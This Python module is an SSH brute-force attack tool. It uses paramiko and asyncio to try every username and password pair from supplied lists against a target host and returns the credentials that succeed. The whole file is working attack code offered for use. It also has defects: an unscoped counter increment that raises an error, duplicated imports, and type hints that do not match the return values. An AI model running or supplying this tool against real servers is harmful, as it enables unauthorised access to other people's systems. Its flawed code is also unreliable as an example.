from typing_extensions import Literal, TypedDict
from typing import Any, List, Dict, Optional, Union, Tuple
from typing import Dict, List, Optional
from pydantic import BaseModel, field_validator
import asyncio
import paramiko
import structlog
from typing import Any, List, Dict, Optional
import logging
"""
SSH brute force attack module.
"""

logger = structlog.get_logger(__name__)

class SSHBruteForceInput(BaseModel):
    """Input model for SSH brute force attack."""
    target_host: str
    target_port: int = 22
    username_list: List[str]
    password_list: List[str]
    timeout_seconds: int = 10
    max_concurrent: int = 5
    
    @field_validator('target_host')
    def validate_host(cls, v) -> bool:
        if not v or len(v.strip()) == 0:
            raise ValueError("Target host cannot be empty")
        return v.strip()
    
    @field_validator('target_port')
    def validate_port(cls, v) -> bool:
        if not 1 <= v <= 65535:
            raise ValueError("Port must be between 1 and 65535")
        return v
    
    @field_validator('username_list')
    def validate_usernames(cls, v) -> bool:
        if not v or len(v) == 0:
            raise ValueError("Username list cannot be empty")
        return v
    
    @field_validator('password_list')
    def validate_passwords(cls, v) -> bool:
        if not v or len(v) == 0:
            raise ValueError("Password list cannot be empty")
        return v

class SSHBruteForceResult(BaseModel):
    """Result model for SSH brute force attack."""
    target_host: str
    target_port: int
    successful_credentials: List[Dict[str, str]]
    failed_attempts: int
    total_attempts: int
    duration_seconds: float
    is_completed: bool
    error_message: Optional[str] = None

async def ssh_brute_force(input_data: SSHBruteForceInput) -> SSHBruteForceResult:
    """
    RORO: Receive SSHBruteForceInput, return SSHBruteForceResult
    
    Perform SSH brute force attack against target host.
    """
    start_time = asyncio.get_event_loop().time()
    successful_credentials = []
    failed_attempts = 0
    total_attempts = 0
    
    try:
        semaphore = asyncio.Semaphore(input_data.max_concurrent)
        
        async def try_credentials(username: str, password: str) -> Optional[Dict[str, str]]:
            """Try a single username/password combination."""
            async with semaphore:
                try:
                    ssh_client = paramiko.SSHClient()
                    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    
                    ssh_client.connect(
                        hostname=input_data.target_host,
                        port=input_data.target_port,
                        username=username,
                        password=password,
                        timeout=input_data.timeout_seconds,
                        banner_timeout=input_data.timeout_seconds
                    )
                    
                    ssh_client.close()
                    logger.info("Successful SSH login", 
                              host=input_data.target_host, 
                              username=username)
                    return {"username": username, "password": password}
                    
                except (paramiko.AuthenticationException, paramiko.SSHException):
                    failed_attempts += 1
                    return None
                except Exception as e:
                    logger.error("SSH connection error", 
                               host=input_data.target_host, 
                               username=username, 
                               error=str(e))
                    failed_attempts += 1
                    return None
        
        # Create tasks for all username/password combinations
        tasks = []
        for username in input_data.username_list:
            for password in input_data.password_list:
                task = try_credentials(username, password)
                tasks.append(task)
                total_attempts += 1
        
        # Execute all tasks concurrently
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Process results
        for result in results:
            if isinstance(result, dict) and result is not None:
                successful_credentials.append(result)
        
        duration = asyncio.get_event_loop().time() - start_time
        
        logger.info("SSH brute force completed", 
                   host=input_data.target_host,
                   successful=len(successful_credentials),
                   failed=failed_attempts,
                   total=total_attempts,
                   duration=duration)
        
        return SSHBruteForceResult(
            target_host=input_data.target_host,
            target_port=input_data.target_port,
            successful_credentials=successful_credentials,
            failed_attempts=failed_attempts,
            total_attempts=total_attempts,
            duration_seconds=duration,
            is_completed=True
        )
        
    except Exception as e:
        duration = asyncio.get_event_loop().time() - start_time
        logger.error("SSH brute force failed", 
                    host=input_data.target_host, 
                    error=str(e))
        
        return SSHBruteForceResult(
            target_host=input_data.target_host,
            target_port=input_data.target_port,
            successful_credentials=successful_credentials,
            failed_attempts=failed_attempts,
            total_attempts=total_attempts,
            duration_seconds=duration,
            is_completed=False,
            error_message=str(e)
        ) 